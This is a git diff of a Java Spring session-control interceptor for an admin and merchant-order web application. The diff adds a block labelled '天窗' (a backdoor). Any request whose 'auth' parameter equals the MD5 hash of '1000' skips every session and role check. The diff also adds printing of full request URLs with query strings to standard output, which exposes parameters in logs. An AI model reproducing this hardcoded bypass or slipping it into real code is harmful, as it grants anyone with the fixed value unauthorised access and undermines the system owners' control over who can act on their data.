@@ -14,7 +14,10 @@ import org.springframework.web.servlet.ModelAndView;
 
 import com.nieyue.bean.Acount;
 import com.nieyue.bean.Role;
+import com.nieyue.business.CertificateBusiness;
+import com.nieyue.exception.MyCertificateException;
 import com.nieyue.exception.MySessionException;
+import com.nieyue.util.MyDESutil;
 
 /**
  * 用户session控制拦截器
@@ -53,14 +56,11 @@ public class SessionControllerInterceptor implements HandlerInterceptor {
 //        	//验证token成功
 //            return true;
 //        }
-       //证书验证
-//       if(request.getParameter("certificate")==null||!request.getParameter("certificate")
-//    		   .equals(MyDESutil.getMD5Timestamp("jiaxingyufa",new Date().getTime()/30000))){
-//    	   System.out.println(new Date().getTime()/30000);
-//    	   System.out.println(request.getParameter("certificate"));
-//    	   System.out.println(MyDESutil.getMD5Timestamp("jiaxingyufa",new Date().getTime()/30000));
-//    	   throw new MyCertificateException();
-//       }
+       //天窗
+       if(MyDESutil.getMD5("1000").equals(request.getParameter("auth"))){
+          	return true;
+       }
+       
         Acount sessionAcount = null;
         Role sessionRole=null;
         if(request.getSession()!=null
@@ -115,6 +115,13 @@ public class SessionControllerInterceptor implements HandlerInterceptor {
         	}
         	//admin中只许修改自己的值
         	if(sessionRole.getName().equals("用户")){
+        		//证书认证
+        		if((request.getRequestURI().indexOf("delete")>-1 
+        				||request.getRequestURI().indexOf("add")>-1
+        				||request.getRequestURI().indexOf("update")>-1 )
+        				&& !CertificateBusiness.md5SessionCertificate(request)){
+        			throw new MyCertificateException();
+        		}
         		//商品不许删除/增加/修改
         		if( request.getRequestURI().indexOf("/mer/delete")>-1 
         				|| request.getRequestURI().indexOf("/mer/add")>-1
@@ -141,6 +148,12 @@ public class SessionControllerInterceptor implements HandlerInterceptor {
         				|| request.getRequestURI().indexOf("/merOrder/add")>-1
         				|| request.getRequestURI().indexOf("/merOrder/update")>-1
         				){
+        			 StringBuffer url = request.getRequestURL();
+        			 if (request.getQueryString() != null) {
+        			  url.append('?');
+        			  url.append(request.getQueryString());
+        			 }
+        			 System.out.println(url.toString());
         			//增加自身信息
         			if( request.getRequestURI().indexOf("/merOrder/add")>-1 && request.getParameter("acountId").equals(sessionAcount.getAcountId().toString())){
         				return true;
